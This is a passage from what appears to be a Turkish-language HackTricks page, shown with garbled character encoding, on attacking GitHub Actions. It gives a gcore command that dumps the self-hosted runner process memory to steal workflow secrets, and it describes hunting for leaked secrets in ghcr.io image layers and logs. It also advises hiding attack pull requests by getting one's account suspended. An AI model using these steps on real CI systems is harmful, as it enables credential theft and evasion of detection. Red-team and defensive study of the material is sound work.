key: ${{ secrets.PUBLISH_KEY }}
```

### Kendi barÄ±ndÄ±ran Ã§alÄ±ÅŸtÄ±rÄ±cÄ±larÄ± kÃ¶tÃ¼ye kullanma

**Github Eylemlerinin Github dÄ±ÅŸÄ± altyapÄ±da Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±** hangi Github Eylemlerinin olduÄŸunu bulmanÄ±n yolu, Github Eylemi yapÄ±landÄ±rma yaml'Ä±nda **`runs-on: self-hosted`** aramaktÄ±r.

**Kendi barÄ±ndÄ±ran** Ã§alÄ±ÅŸtÄ±rÄ±cÄ±lar, **ekstra hassas bilgilere**, diÄŸer **aÄŸ sistemlerine** (aÄŸda zafiyete sahip uÃ§ noktalar? meta veri hizmeti?) veya izole edilmiÅŸ ve yok edilmiÅŸ olsa bile, **aynÄ± anda birden fazla eylem Ã§alÄ±ÅŸtÄ±rÄ±labilir** ve kÃ¶tÃ¼ niyetli olan diÄŸerinin secret'larÄ±nÄ± **Ã§alabilir**.

Kendi barÄ±ndÄ±ran Ã§alÄ±ÅŸtÄ±rÄ±cÄ±larda, **_Runner.Listener_** iÅŸleminin belleÄŸini dÃ¶kleyerek, herhangi bir adÄ±mda iÅŸ akÄ±ÅŸlarÄ±nÄ±n tÃ¼m secret'larÄ±nÄ± iÃ§erecek ÅŸekilde, iÅŸ akÄ±ÅŸlarÄ±nÄ±n tÃ¼m secret'larÄ±nÄ± elde etmek de mÃ¼mkÃ¼ndÃ¼r:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Daha fazla bilgi iÃ§in [**bu yazÄ±ya bakÄ±n**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker GÃ¶rÃ¼ntÃ¼sÃ¼ KayÄ±t Defteri

Github iÃ§inde bir Docker gÃ¶rÃ¼ntÃ¼sÃ¼ oluÅŸturan ve saklayan Github eylemleri yapmak mÃ¼mkÃ¼ndÃ¼r.\
Bir Ã¶rnek aÅŸaÄŸÄ±daki aÃ§Ä±lÄ±r menÃ¼de bulunabilir:

<details>

<summary>Github Eylemi GÃ¶rÃ¼ntÃ¼ OluÅŸtur ve Ä°ti Docker GÃ¶rÃ¼ntÃ¼sÃ¼</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Ã–nceki kodda gÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, Github kayÄ±t defteri **`ghcr.io`** Ã¼zerinde barÄ±ndÄ±rÄ±lÄ±r.

Depoya okuma izinleri olan bir kullanÄ±cÄ±, kiÅŸisel eriÅŸim belirteci kullanarak Docker Image'Ä± indirebilecektir:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Sonra, kullanÄ±cÄ± **Docker imaj katmanlarÄ±nda sÄ±zdÄ±rÄ±lan sÄ±rlarÄ±** arayabilir:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions gÃ¼nlÃ¼klerinde hassas bilgiler

**Github**, eylemler gÃ¼nlÃ¼klerinde **gizli deÄŸerleri tespit etmeye** ve onlarÄ± **gÃ¶stermemeye** Ã§alÄ±ÅŸsa da, eylemin yÃ¼rÃ¼tÃ¼lmesi sÄ±rasÄ±nda oluÅŸturulmuÅŸ **diÄŸer hassas veriler** gizlenmeyecektir. Ã–rneÄŸin, bir gizli deÄŸerle imzalanmÄ±ÅŸ bir JWT, [Ã¶zel olarak yapÄ±landÄ±rÄ±lmadÄ±kÃ§a](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) gizlenmeyecektir.

## Ä°zleri Gizleme

([**buradan**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit) Teknik) Ä°lk olarak, herhangi bir PR'nin Github'da halka aÃ§Ä±k olarak gÃ¶rÃ¼lebilir olduÄŸunu unutmayÄ±n ve hedef GitHub hesabÄ±na da gÃ¶rÃ¼nÃ¼r. GitHub'da varsayÄ±lan olarak, **bir PR'yi internetten silemeyiz**, ancak bir sÃ¼rpriz var. Github tarafÄ±ndan **askÄ±ya alÄ±nan** Github hesaplarÄ± iÃ§in, tÃ¼m **PR'ler otomatik olarak silinir** ve internetten kaldÄ±rÄ±lÄ±r. Bu nedenle, etkinliÄŸinizi gizlemek iÃ§in ya **GitHub hesabÄ±nÄ±zÄ±n askÄ±ya alÄ±nmasÄ±nÄ± veya hesabÄ±nÄ±zÄ±n iÅŸaretlenmesini** saÄŸlamanÄ±z gerekmektedir. Bu, GitHub'daki tÃ¼m etkinliklerinizi (temel olarak tÃ¼m saldÄ±rÄ± PR'lerinizi kaldÄ±rÄ±r)

Bir organizasyon, GitHub'a hesaplarÄ± bildirmek konusunda Ã§ok proaktiftir. YapmanÄ±z gereken tek ÅŸey, Sorunlarda "bazÄ± ÅŸeyler" paylaÅŸmak ve onlar 12 saat iÃ§inde hesabÄ±nÄ±zÄ±n askÄ±ya alÄ±nmasÄ±nÄ± saÄŸlayacaklar :p ve iÅŸte, saldÄ±rÄ±nÄ±zÄ± github'da gÃ¶rÃ¼nmez hale getirdiniz.

{% hint style="warning" %}
Bir organizasyonun hedef alÄ±ndÄ±ÄŸÄ±nÄ± anlamasÄ± iÃ§in GitHub gÃ¼nlÃ¼klerini SIEM'den kontrol etmesi gerekmektedir, Ã§Ã¼nkÃ¼ GitHub UI'den PR kaldÄ±rÄ±lacaktÄ±r.
{% endhint %}

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
